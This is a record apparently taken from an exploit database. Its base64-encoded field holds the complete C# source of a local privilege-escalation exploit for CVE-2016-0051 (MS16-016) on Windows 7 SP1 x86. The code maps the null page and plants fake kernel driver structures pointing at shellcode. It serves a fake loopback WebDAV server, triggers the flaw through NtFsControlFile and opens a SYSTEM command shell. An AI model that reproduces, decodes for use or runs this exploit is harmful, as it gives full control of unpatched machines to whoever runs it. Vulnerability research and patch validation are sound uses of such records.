{
    "source": "exploit-database", 
    "exploit": "LyoNCg0KU291cmNlOiBodHRwczovL2dpdGh1Yi5jb20va29jemthdGFtYXMvQ1ZFLTIwMTYtMDA1MQ0KDQpQcm9vZi1vZi1jb25jZXB0IEJTb0QgKEJsdWUgU2NyZWVuIG9mIERlYXRoKSBjb2RlIGZvciBDVkUtMjAxNi0wMDUxIChNUy0wMTYpLg0KDQpGdWxsIFByb29mIG9mIENvbmNlcHQ6DQpodHRwczovL2dpdGh1Yi5jb20va29jemthdGFtYXMvQ1ZFLTIwMTYtMDA1MS9hcmNoaXZlL21hc3Rlci56aXANCmh0dHBzOi8vZ2l0aHViLmNvbS9vZmZlbnNpdmUtc2VjdXJpdHkvZXhwbG9pdC1kYXRhYmFzZS1iaW4tc3Bsb2l0cy9yYXcvbWFzdGVyL3NwbG9pdHMvMzk0MzItMS56aXANCg0KDQpFbGV2YXRpb24gb2YgUHJpdmlsZWdlIChTWVNURU0pIGV4cGxvaXQgZm9yIENWRS0yMDE2LTAwNTEgKE1TMTYtMDE2KSBmb3IgV2luZG93cyA3IFNQMSB4ODYgKGJ1aWxkIDc2MDEpDQpDcmVhdG9yOiBUYW3DoXMgS29jemthIChAa29jemthdGFtYXMgLSBodHRwczovL3R3aXR0ZXIuY29tL2tvY3prYXRhbWFzKQ0KT3JpZ2luYWwgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20va29jemthdGFtYXMvQ1ZFLTIwMTYtMDA1MQ0KDQoqLw0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOw0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLkxpbnE7DQp1c2luZyBTeXN0ZW0uTmV0Ow0KdXNpbmcgU3lzdGVtLk5ldC5Tb2NrZXRzOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KdXNpbmcgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbDsNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KdXNpbmcgU3lzdGVtLlRocmVhZGluZzsNCg0KbmFtZXNwYWNlIEVvUA0Kew0KICAgIGNsYXNzIFByb2dyYW0NCiAgICB7DQogICAgICAgICNyZWdpb24gRmFrZSBXZWJEQVYgc2VydmVyDQoNCiAgICAgICAgc3RhdGljIHZvaWQgU3RhcnRGYWtlV2ViRGF2U2VydmVyKGludCBwb3J0KQ0KICAgICAgICB7DQogICAgICAgICAgICBuZXcgVGhyZWFkKCgpID0+DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHNlcnZlciA9IG5ldyBUY3BMaXN0ZW5lcihJUEFkZHJlc3MuTG9vcGJhY2ssIHBvcnQpOw0KICAgICAgICAgICAgICAgIHNlcnZlci5TdGFydCgpOw0KICAgICAgICAgICAgICAgIHdoaWxlICh0cnVlKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdXNpbmcgKHZhciBjbGllbnQgPSBzZXJ2ZXIuQWNjZXB0VGNwQ2xpZW50KCkpDQogICAgICAgICAgICAgICAgICAgIHVzaW5nICh2YXIgc3RyZWFtID0gY2xpZW50LkdldFN0cmVhbSgpKQ0KICAgICAgICAgICAgICAgICAgICB1c2luZyAodmFyIHJlYWRlciA9IG5ldyBTdHJlYW1SZWFkZXIoc3RyZWFtLCBFbmNvZGluZy5HZXRFbmNvZGluZygiaXNvLTg4NTktMSIpKSkNCiAgICAgICAgICAgICAgICAgICAgdXNpbmcgKHZhciB3cml0ZXIgPSBuZXcgU3RyZWFtV3JpdGVyKHN0cmVhbSwgRW5jb2RpbmcuR2V0RW5jb2RpbmcoImlzby04ODU5LTEiKSkgeyBBdXRvRmx1c2ggPSB0cnVlIH0pDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIEZ1bmM8c3RyaW5nPiBybCA9ICgpID0+DQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGxpbmUgPSByZWFkZXIuUmVhZExpbmUoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL0NvbnNvbGUuV3JpdGVMaW5lKCI8ICIgKyBsaW5lKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gbGluZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH07DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIEFjdGlvbjxzdHJpbmc+IHdsID0gb3V0RGF0YSA9Pg0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vQ29uc29sZS5Xcml0ZUxpbmUoU3RyaW5nLkpvaW4oIlxuIiwgb3V0RGF0YS5TcGxpdCgnXG4nKS5TZWxlY3QoeCA9PiAiPiAiICsgeCkpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIuV3JpdGUob3V0RGF0YSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9Ow0KDQogICAgICAgICAgICAgICAgICAgICAgICB2YXIgaGRyTGluZSA9IHJsKCk7DQogICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiWypdIFJlcXVlc3Q6ICIgKyBoZHJMaW5lKTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGhlYWRlciA9IGhkckxpbmUuU3BsaXQoJyAnKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlICghc3RyaW5nLklzTnVsbE9yRW1wdHkocmwoKSkpIHsgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoaGVhZGVyWzBdID09ICJPUFRJT05TIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3bCgiSFRUUC8xLjEgMjAwIE9LXHJcbk1TLUF1dGhvci1WaWE6IERBVlxyXG5EQVY6IDEsMiwxI2V4dGVuZFxyXG5BbGxvdzogT1BUSU9OUyxHRVQsSEVBRCxQUk9QRklORFxyXG5cclxuIik7DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChoZWFkZXJbMF0gPT0gIlBST1BGSU5EIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgYm9keSA9IFN0cmluZy5Gb3JtYXQoQCINCjw/eG1sIHZlcnNpb249IiIxLjAiIiBlbmNvZGluZz0iIlVURi04IiI/Pg0KPEQ6bXVsdGlzdGF0dXMgeG1sbnM6RD0iIkRBVjoiIj4NCjxEOnJlc3BvbnNlPg0KICAgIDxEOmhyZWY+ezB9PC9EOmhyZWY+DQogICAgPEQ6cHJvcHN0YXQ+DQogICAgICAgIDxEOnByb3A+DQogICAgICAgICAgICA8RDpjcmVhdGlvbmRhdGU+ezE6c31aPC9EOmNyZWF0aW9uZGF0ZT4NCiAgICAgICAgICAgIDxEOmdldGNvbnRlbnRsZW5ndGg+ezN9PC9EOmdldGNvbnRlbnRsZW5ndGg+DQogICAgICAgICAgICA8RDpnZXRjb250ZW50dHlwZT57NH08L0Q6Z2V0Y29udGVudHR5cGU+DQogICAgICAgICAgICA8RDpnZXRldGFnPns1fTwvRDpnZXRldGFnPg0KICAgICAgICAgICAgPEQ6Z2V0bGFzdG1vZGlmaWVkPns2OlJ9PC9EOmdldGxhc3Rtb2RpZmllZD4NCiAgICAgICAgICAgIDxEOnJlc291cmNldHlwZT57OH08L0Q6cmVzb3VyY2V0eXBlPg0KICAgICAgICAgICAgPEQ6c3VwcG9ydGVkbG9jaz48L0Q6c3VwcG9ydGVkbG9jaz4NCiAgICAgICAgICAgIDxEOmlzaGlkZGVuPns3fTwvRDppc2hpZGRlbj4NCiAgICAgICAgPC9EOnByb3A+DQogICAgICAgIDxEOnN0YXR1cz5IVFRQLzEuMSAyMDAgT0s8L0Q6c3RhdHVzPg0KICAgIDwvRDpwcm9wc3RhdD4NCjwvRDpyZXNwb25zZT4NCjwvRDptdWx0aXN0YXR1cz4iLCBoZWFkZXJbMV0sIERhdGVUaW1lLlV0Y05vdy5Ub1VuaXZlcnNhbFRpbWUoKSwgIiIsICIwIiwgIiIsICIiLCBEYXRlVGltZS5VdGNOb3cuVG9Vbml2ZXJzYWxUaW1lKCksIDAsIGhlYWRlclsxXS5Db250YWlucygiZmlsZSIpID8gIiIgOiAiPEQ6Y29sbGVjdGlvbj48L0Q6Y29sbGVjdGlvbj4iKS5UcmltKCk7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3bCgiSFRUUC8xLjEgMjA3IE11bHRpLVN0YXR1c1xyXG5NUy1BdXRob3ItVmlhOiBEQVZcclxuREFWOiAxLDIsMSNleHRlbmRcclxuQ29udGVudC1MZW5ndGg6ICIgKyBib2R5Lkxlbmd0aCArICJcclxuQ29udGVudC1UeXBlOiB0ZXh0L3htbFxyXG5cclxuIiArIGJvZHkpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdsKCJIVFRQLzEuMSA1MDAgSW50ZXJuYWwgU2VydmVyIEVycm9yXHJcblxyXG4iKTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgLy9Db25zb2xlLldyaXRlTGluZSgiID09PT09PT09PT09PT09PSBFTkQgUkVRVUVTVCA9PT09PT09PT09PT09PT0gIik7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9KSB7IElzQmFja2dyb3VuZCA9IHRydWUsIE5hbWUgPSAiV2ViREFWIHNlcnZlciB0aHJlYWQiIH0uU3RhcnQoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICNlbmRyZWdpb24NCg0KICAgICAgICAjcmVnaW9uIFdpbkFQSQ0KDQogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIENhbGxpbmdDb252ZW50aW9uID0gQ2FsbGluZ0NvbnZlbnRpb24uU3RkQ2FsbCwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVGaWxlKHN0cmluZyBscEZpbGVOYW1lLCB1aW50IGR3RGVzaXJlZEFjY2VzcywgdWludCBkd1NoYXJlTW9kZSwgSW50UHRyIHNlY3VyaXR5QXR0cmlidXRlcywgdWludCBkd0NyZWF0aW9uRGlzcG9zaXRpb24sIHVpbnQgZHdGbGFnc0FuZEF0dHJpYnV0ZXMsIEludFB0ciBoVGVtcGxhdGVGaWxlKTsNCg0KICAgICAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldDQogICAgICAgIHByaXZhdGUgY2xhc3MgTkVUUkVTT1VSQ0UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHVpbnQgZHdTY29wZSA9IDA7DQogICAgICAgICAgICBwdWJsaWMgdWludCBkd1R5cGUgPSAwOw0KICAgICAgICAgICAgcHVibGljIHVpbnQgZHdEaXNwbGF5VHlwZSA9IDA7DQogICAgICAgICAgICBwdWJsaWMgdWludCBkd1VzYWdlID0gMDsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgbHBMb2NhbE5hbWUgPSBudWxsOw0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBscFJlbW90ZU5hbWUgPSBudWxsOw0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBscENvbW1lbnQgPSBudWxsOw0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBscFByb3ZpZGVyID0gbnVsbDsNCiAgICAgICAgfQ0KDQogICAgICAgIFtEbGxJbXBvcnQoIm1wci5kbGwiKV0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBXTmV0QWRkQ29ubmVjdGlvbjIoTkVUUkVTT1VSQ0UgbHBOZXRSZXNvdXJjZSwgc3RyaW5nIGxwUGFzc3dvcmQsIHN0cmluZyBscFVzZXJuYW1lLCBpbnQgZHdGbGFncyk7DQoNCiAgICAgICAgLy8gYmFzZWQgb24gaHR0cDovL3d3dy5jb2RlcHJvamVjdC5jb20vQXJ0aWNsZXMvMjE5NzQvV2luZG93cy1OVC1OYXRpdmUtQVBJLVdyYXBwZXItTGlicmFyeQ0KDQogICAgICAgIHB1YmxpYyBlbnVtIFBhZ2VQcm90ZWN0aW9uIDogdWludA0KICAgICAgICB7DQogICAgICAgICAgICBOT0FDQ0VTUyA9IDB4MDEsDQogICAgICAgICAgICBSRUFET05MWSA9IDB4MDIsDQogICAgICAgICAgICBSRUFEV1JJVEUgPSAweDA0LA0KICAgICAgICAgICAgV1JJVEVDT1BZID0gMHgwOCwNCiAgICAgICAgICAgIEVYRUNVVEUgPSAweDEwLA0KICAgICAgICAgICAgRVhFQ1VURV9SRUFEID0gMHgyMCwNCiAgICAgICAgICAgIEVYRUNVVEVfUkVBRFdSSVRFID0gMHg0MCwNCiAgICAgICAgICAgIEVYRUNVVEVfV1JJVEVDT1BZID0gMHg4MCwNCiAgICAgICAgICAgIEdVQVJEID0gMHgxMDAsDQogICAgICAgICAgICBOT0NBQ0hFID0gMHgyMDAsDQogICAgICAgICAgICBXUklURUNPTUJJTkUgPSAweDQwMA0KICAgICAgICB9DQoNCiAgICAgICAgW0ZsYWdzXQ0KICAgICAgICBwdWJsaWMgZW51bSBNZW1vcnlBbGxvY2F0aW9uVHlwZSA6IHVpbnQNCiAgICAgICAgew0KICAgICAgICAgICAgQ09NTUlUID0gMHgxMDAwLA0KICAgICAgICAgICAgUkVTRVJWRSA9IDB4MjAwMCwNCiAgICAgICAgICAgIEZSRUUgPSAweDEwMDAwLA0KICAgICAgICAgICAgUFJJVkFURSA9IDB4MjAwMDAsDQogICAgICAgICAgICBNQVBQRUQgPSAweDQwMDAwLA0KICAgICAgICAgICAgUkVTRVQgPSAweDgwMDAwLA0KICAgICAgICAgICAgVE9QX0RPV04gPSAweDEwMDAwMCwNCiAgICAgICAgICAgIFdSSVRFX1dBVENIID0gMHgyMDAwMDAsDQogICAgICAgICAgICBST1RBVEUgPSAweDgwMDAwMCwNCiAgICAgICAgICAgIExBUkdFX1BBR0VTID0gMHgyMDAwMDAwMCwNCiAgICAgICAgICAgIFBIWVNJQ0FMID0gMHg0MDAwMDAsDQogICAgICAgICAgICBGT1VSX01CX1BBR0VTID0gMHg4MDAwMDAwMA0KICAgICAgICB9DQoNCiAgICAgICAgW0RsbEltcG9ydCgibnRkbGwuZGxsIiwgVGhyb3dPblVubWFwcGFibGVDaGFyID0gdHJ1ZSwgQmVzdEZpdE1hcHBpbmcgPSBmYWxzZSwgU2V0TGFzdEVycm9yID0gZmFsc2UpXQ0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBOdFN0YXR1cyBOdEFsbG9jYXRlVmlydHVhbE1lbW9yeShbSW5dIEludFB0ciBwcm9jZXNzSGFuZGxlLCBbSW4sIE91dF0gcmVmIEludFB0ciBiYXNlQWRkcmVzcywgW0luXSB1aW50IHplcm9CaXRzLCBbSW4sIE91dF0gcmVmIFVJbnRQdHIgcmVnaW9uU2l6ZSwgW0luXSBNZW1vcnlBbGxvY2F0aW9uVHlwZSBhbGxvY2F0aW9uVHlwZSwgW0luXSBQYWdlUHJvdGVjdGlvbiBwcm90ZWN0KTsNCg0KICAgICAgICBwdWJsaWMgZW51bSBGaWxlT3BlbkluZm9ybWF0aW9uDQogICAgICAgIHsNCiAgICAgICAgICAgIFN1cGVyY2VkZWQgPSAweDAwMDAwMDAwLA0KICAgICAgICAgICAgT3BlbmVkID0gMHgwMDAwMDAwMSwNCiAgICAgICAgICAgIENyZWF0ZWQgPSAweDAwMDAwMDAyLA0KICAgICAgICAgICAgT3ZlcndyaXR0ZW4gPSAweDAwMDAwMDAzLA0KICAgICAgICAgICAgRXhpc3RzID0gMHgwMDAwMDAwNCwNCiAgICAgICAgICAgIERvZXNOb3RFeGlzdCA9IDB4MDAwMDAwMDUNCiAgICAgICAgfQ0KDQogICAgICAgIGludGVybmFsIGVudW0gTnRTdGF0dXMgOiB1aW50DQogICAgICAgIHsNCiAgICAgICAgICAgIFNVQ0NFU1MgPSAweDAwMDAwMDAwLA0KICAgICAgICAgICAgSU5WQUxJRF9QQVJBTUVURVJfMSA9IDB4QzAwMDAwRUYsDQogICAgICAgICAgICBJTlZBTElEX1BBUkFNRVRFUl8yID0gMHhDMDAwMDBGMCwNCiAgICAgICAgICAgIElOVkFMSURfUEFSQU1FVEVSXzMgPSAweEMwMDAwMEYxLA0KICAgICAgICAgICAgSU5WQUxJRF9QQVJBTUVURVJfNCA9IDB4QzAwMDAwRjIsDQogICAgICAgICAgICAvLyBkb24ndCBjYXJlDQogICAgICAgIH0NCg0KICAgICAgICBpbnRlcm5hbCBzdHJ1Y3QgSW9TdGF0dXNCbG9jaw0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgTnRTdGF0dXMgc3RhdHVzOw0KICAgICAgICAgICAgcHVibGljIEluZm9ybWF0aW9uVW5pb24gSW5mb3JtYXRpb247DQoNCiAgICAgICAgICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5FeHBsaWNpdCldDQogICAgICAgICAgICBwdWJsaWMgc3RydWN0IEluZm9ybWF0aW9uVW5pb24NCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBbRmllbGRPZmZzZXQoMCldDQogICAgICAgICAgICAgICAgcHVibGljIEZpbGVPcGVuSW5mb3JtYXRpb24gRmlsZU9wZW5JbmZvcm1hdGlvbjsNCiAgICAgICAgICAgICAgICBbRmllbGRPZmZzZXQoMCldDQogICAgICAgICAgICAgICAgcHVibGljIHVpbnQgQnl0ZXNXcml0dGVuOw0KICAgICAgICAgICAgICAgIFtGaWVsZE9mZnNldCgwKV0NCiAgICAgICAgICAgICAgICBwdWJsaWMgdWludCBCeXRlc1JlYWQ7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiLCBUaHJvd09uVW5tYXBwYWJsZUNoYXIgPSB0cnVlLCBCZXN0Rml0TWFwcGluZyA9IGZhbHNlLCBTZXRMYXN0RXJyb3IgPSBmYWxzZSwgRXhhY3RTcGVsbGluZyA9IHRydWUsIFByZXNlcnZlU2lnID0gdHJ1ZSldDQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIE50U3RhdHVzIE50RnNDb250cm9sRmlsZShbSW5dIEludFB0ciBmaWxlSGFuZGxlLCBbSW4sIE9wdGlvbmFsXSBJbnRQdHIgRXZlbnQsIFtJbiwgT3B0aW9uYWxdIEludFB0ciBhcGNSb3V0aW5lLCBbSW4sIE9wdGlvbmFsXSBJbnRQdHIgYXBjQ29udGV4dCwgW091dF0gb3V0IElvU3RhdHVzQmxvY2sgaW9TdGF0dXNCbG9jaywgW0luXSB1aW50IGZzQ29udHJvbENvZGUsIFtJbiwgT3B0aW9uYWxdIEludFB0ciBpbnB1dEJ1ZmZlciwgW0luXSB1aW50IGlucHV0QnVmZmVyTGVuZ3RoLCBbT3V0LCBPcHRpb25hbF0gSW50UHRyIG91dHB1dEJ1ZmZlciwgW0luXSB1aW50IG91dHB1dEJ1ZmZlckxlbmd0aCk7DQoNCiAgICAgICAgW1VubWFuYWdlZEZ1bmN0aW9uUG9pbnRlcihDYWxsaW5nQ29udmVudGlvbi5TdGRDYWxsKV0NCiAgICAgICAgZGVsZWdhdGUgaW50IExvYWRBbmRHZXRLZXJuZWxCYXNlUHRyKCk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gQ2hhclNldC5BbnNpKV0NCiAgICAgICAgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkxQU3RyKV1zdHJpbmcgbHBGaWxlTmFtZSk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIiLCBDaGFyU2V0ID0gQ2hhclNldC5BbnNpLCBFeGFjdFNwZWxsaW5nID0gdHJ1ZSwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFByb2NBZGRyZXNzKEludFB0ciBoTW9kdWxlLCBzdHJpbmcgcHJvY05hbWUpOw0KDQogICAgICAgICNlbmRyZWdpb24NCg0KICAgICAgICBwcml2YXRlIHN0YXRpYyBieXRlW10gaWwocGFyYW1zIHVpbnRbXSBpbnApIHsgcmV0dXJuIGlucC5TZWxlY3RNYW55KEJpdENvbnZlcnRlci5HZXRCeXRlcykuVG9BcnJheSgpOyB9DQogICAgICAgIHByaXZhdGUgc3RhdGljIGJ5dGVbXSB6KGludCBjKSB7IHJldHVybiByZXAoMCwgYyk7IH0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgYnl0ZVtdIHJlcChieXRlIGIsIGludCBjKSB7IHJldHVybiBFbnVtZXJhYmxlLlJlcGVhdChiLCBjKS5Ub0FycmF5KCk7IH0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgYnl0ZVtdIGZsKGJ5dGVbXVtdIGlucCkgeyByZXR1cm4gaW5wLlNlbGVjdE1hbnkoeCA9PiB4KS5Ub0FycmF5KCk7IH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgc2hlbGxjb2RlRGxsID0gTG9hZExpYnJhcnkoInNoZWxsY29kZS5kbGwiKTsNCiAgICAgICAgICAgIHZhciBzaGVsbGNvZGVGdW5jID0gR2V0UHJvY0FkZHJlc3Moc2hlbGxjb2RlRGxsLCAiX3NoZWxsY29kZUA4Iik7DQoNCiAgICAgICAgICAgIHZhciBsb2FkQW5kR2V0S2VybmVsQmFzZUZ1bmMgPSBHZXRQcm9jQWRkcmVzcyhzaGVsbGNvZGVEbGwsICJfTG9hZEFuZEdldEtlcm5lbEJhc2VAMCIpOw0KICAgICAgICAgICAgdmFyIGxvYWRBbmRHZXRLZXJuZWxCYXNlID0gKExvYWRBbmRHZXRLZXJuZWxCYXNlUHRyKU1hcnNoYWwuR2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIobG9hZEFuZEdldEtlcm5lbEJhc2VGdW5jLCB0eXBlb2YoTG9hZEFuZEdldEtlcm5lbEJhc2VQdHIpKTsNCg0KICAgICAgICAgICAgdmFyIGxvYWRSZXN1bHQgPSBsb2FkQW5kR2V0S2VybmVsQmFzZSgpOw0KICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJbKl0gTG9hZEFuZEdldEtlcm5lbEJhc2UgcmVzdWx0ID0ge2xvYWRSZXN1bHR9Iik7DQoNCiAgICAgICAgICAgIHZhciBhZGRyID0gbmV3IEludFB0cigweDEwMDApOw0KICAgICAgICAgICAgdmFyIHNpemUgPSBuZXcgVUludFB0cigweDQwMDApOw0KICAgICAgICAgICAgdmFyIHJlc3VsdCA9IE50QWxsb2NhdGVWaXJ0dWFsTWVtb3J5KG5ldyBJbnRQdHIoLTEpLCByZWYgYWRkciwgMCwgcmVmIHNpemUsIE1lbW9yeUFsbG9jYXRpb25UeXBlLlJFU0VSVkUgfCBNZW1vcnlBbGxvY2F0aW9uVHlwZS5DT01NSVQsIFBhZ2VQcm90ZWN0aW9uLlJFQURXUklURSk7DQogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgkIlsqXSBOdEFsbG9jYXRlVmlydHVhbE1lbW9yeSByZXN1bHQgPSB7cmVzdWx0fSwgYWRkciA9IHthZGRyfSwgc2l6ZSA9IHtzaXplfSIpOw0KDQogICAgICAgICAgICBpZiAocmVzdWx0ICE9IE50U3RhdHVzLlNVQ0NFU1MgfHwgbG9hZFJlc3VsdCAhPSAwKQ0KICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbLV0gRmFpbC4uLiBzbyBzYWQgOigiKTsNCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiWypdIENyZWF0aW5nIGZha2UgRGV2aWNlT2JqZWN0LCBEcml2ZXJPYmplY3QsIGV0YyBzdHJ1Y3R1cmVzLi4uIik7DQogICAgICAgICAgICAgICAgdmFyIHBheWxvYWQgPSBmbChuZXdbXSB7IHooOCksIC8qIFsweDhdRHJpdmVyT2JqZWN0PTAgKi8gaWwoMCksIHooMHgzMCAtIDggLSA0KSwgLyogWzB4MzBdU3RhY2tTaXplPTI1NiAqLyBpbCgweDEwLCAwKSwgeigxMyAqIDQpLCBpbCgodWludClzaGVsbGNvZGVGdW5jLlRvSW50MzIoKSkgfSk7DQogICAgICAgICAgICAgICAgTWFyc2hhbC5Db3B5KHBheWxvYWQsIDEsIG5ldyBJbnRQdHIoMSksIHBheWxvYWQuTGVuZ3RoIC0gMSk7DQoNCiAgICAgICAgICAgICAgICB2YXIgcCA9IG5ldyBSYW5kb20oKS5OZXh0KDEwMjQsIDY1NTM1KTsNCiAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiWypdIFN0YXJ0aW5nIGZha2Ugd2ViZGF2IHNlcnZlci4uLiIpOw0KICAgICAgICAgICAgICAgIFN0YXJ0RmFrZVdlYkRhdlNlcnZlcihwKTsNCg0KICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbKl0gQ2FsbGluZyBXTmV0QWRkQ29ubmVjdGlvbjIuLi4iKTsNCiAgICAgICAgICAgICAgICB2YXIgYWRkQ29ubmVjdGlvblJlc3VsdCA9IFdOZXRBZGRDb25uZWN0aW9uMihuZXcgTkVUUkVTT1VSQ0UgeyBscFJlbW90ZU5hbWUgPSAkQCJcXDEyNy4wLjAuMUB7cH1cZm9sZGVyXCIgfSwgbnVsbCwgbnVsbCwgMCk7DQogICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlsqXSBXTmV0QWRkQ29ubmVjdGlvbjIgPSAiICsgYWRkQ29ubmVjdGlvblJlc3VsdCk7DQoNCiAgICAgICAgICAgICAgICB2YXIgZmlsZUhhbmRsZSA9IENyZWF0ZUZpbGUoJEAiXFwxMjcuMC4wLjFAe3B9XGZvbGRlclxmaWxlIiwgMHg4MCwgNywgSW50UHRyLlplcm8sIDMsIDAsIEludFB0ci5aZXJvKTsNCiAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgkIlsqXSBDcmVhdGVGaWxlIHJlc3VsdCA9IHtmaWxlSGFuZGxlfSIpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIElvU3RhdHVzQmxvY2sgaW9TdGF0dXNCbG9jazsNCiAgICAgICAgICAgICAgICB2YXIgaW5wdXRMZW4gPSAyNDsNCiAgICAgICAgICAgICAgICB2YXIgaW5wdXRQdHIgPSBNYXJzaGFsLkFsbG9jSEdsb2JhbChpbnB1dExlbik7DQogICAgICAgICAgICAgICAgdmFyIG91dHB1dExlbiA9IDQ7DQogICAgICAgICAgICAgICAgdmFyIG91dHB1dFB0ciA9IE1hcnNoYWwuQWxsb2NIR2xvYmFsKG91dHB1dExlbik7DQogICAgICAgICAgICAgICAgdmFyIGNvbnRyb2xSZXN1bHQgPSBOdEZzQ29udHJvbEZpbGUoZmlsZUhhbmRsZSwgSW50UHRyLlplcm8sIEludFB0ci5aZXJvLCBJbnRQdHIuWmVybywgb3V0IGlvU3RhdHVzQmxvY2ssIDB4OTAwREJ1LCBpbnB1dFB0ciwgKHVpbnQpaW5wdXRMZW4sIG91dHB1dFB0ciwgKHVpbnQpb3V0cHV0TGVuKTsNCiAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgkIlsqXSBOdEZzQ29udHJvbEZpbGUgcmVzdWx0ID0ge2NvbnRyb2xSZXN1bHR9Iik7DQoNCiAgICAgICAgICAgICAgICB2YXIgaWRlbnRpdHkgPSBXaW5kb3dzSWRlbnRpdHkuR2V0Q3VycmVudCgpOw0KICAgICAgICAgICAgICAgIGlmIChpZGVudGl0eT8uSXNTeXN0ZW0gPT0gdHJ1ZSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbK10gR290IFNZU1RFTSEgU3Bhd25pbmcgYSBzaGVsbC4uLiIpOw0KICAgICAgICAgICAgICAgICAgICBQcm9jZXNzLlN0YXJ0KCJjbWQiKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgkIlstXSBTb21ldGhpbmcgd2VudCB3cm9uZywgbG9va3MgbGlrZSB3ZSBhcmUgbm90IFNZU1RFTSA6KCwgb25seSB7aWRlbnRpdHk/Lk5hbWV9Li4uIik7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCIiKTsNCiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJQcmVzcyBFTlRFUiB0byBleGl0LiIpOw0KICAgICAgICAgICAgQ29uc29sZS5SZWFkTGluZSgpOw0KICAgICAgICB9DQogICAgfQ0KfQ==", 
    "filename": "platforms/win_x86/local/39432.c", 
